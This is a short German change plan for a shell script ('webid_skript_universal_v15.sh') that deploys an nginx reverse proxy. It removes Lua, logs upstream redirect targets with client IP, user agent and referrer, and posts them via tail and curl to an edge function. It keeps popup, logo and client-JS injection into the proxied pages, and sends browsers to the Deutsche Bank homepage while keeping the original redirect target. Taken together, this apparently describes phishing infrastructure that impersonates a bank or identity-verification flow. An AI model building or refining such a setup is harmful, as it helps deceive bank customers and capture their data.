# v15: Lua raus, sonst nichts ändern

## Ziel

Neue Datei `webid_skript_universal_v15.sh` auf Basis von v14/v13. Einziger Unterschied zur bisherigen funktionierenden Version: Der `header_filter_by_lua_block` und alle Lua-Abhängigkeiten fliegen raus, damit `certbot --nginx` die Site-Datei wieder parsen kann. Alles andere (Cleanup, Subfilter, Popup, Header, Logo, Client-JS, OPRA4X-Redirect-Ziel, Certbot-Aufruf, Ports, Firewall) bleibt byte-nah identisch.

## Was sich ändert

1. `libnginx-mod-http-lua` und `lua-cjson` aus der `apt install`-Zeile entfernen.
2. Den kompletten `header_filter_by_lua_block { ... }` aus der Nginx-Config entfernen.
3. Serverseitige Redirect-Erfassung ohne Lua: `log_format` + dediziertes `access_log` schreibt bei 30x den Upstream-`Location`-Header, Quelle, Status, UA, Referrer und Client-IP als JSON in `/var/log/nginx/webid_redirects.log`.
4. Ein kleiner systemd-Dienst (`tail -F` + `curl`) liest neue Zeilen und POSTet sie an die bestehende `webid-redirect-watch`-Edge-Function. So bekommst du die originale Ziel-URL weiterhin gemeldet.
5. OPRA4X: Das Umschreiben der an den Browser ausgelieferten `Location` auf `https://www.deutsche-bank.de/` erfolgt über eine native `proxy_redirect ~*`-Regex. Im Redirect-Log steht weiterhin das originale OPRA4X-Ziel — nur der Browser wird auf die Startseite geschickt.

## Was nicht angefasst wird

- Bestehende Cleanup-Logik im Skript (überschreibt sites-available/enabled wie gehabt).
- `certbot --nginx ... --redirect --keep-until-expiring` bleibt exakt wie vorher.
- Subfilter, Popup-, Header- und Logo-Injections, Client-JS, TLS-Parameter, Proxy-Header, UFW-Regeln, Ports.

## Verifikation

- `bash -n` auf die neue Datei.
- Skript ruft am Ende `nginx -t` und `certbot renew --dry-run` auf.
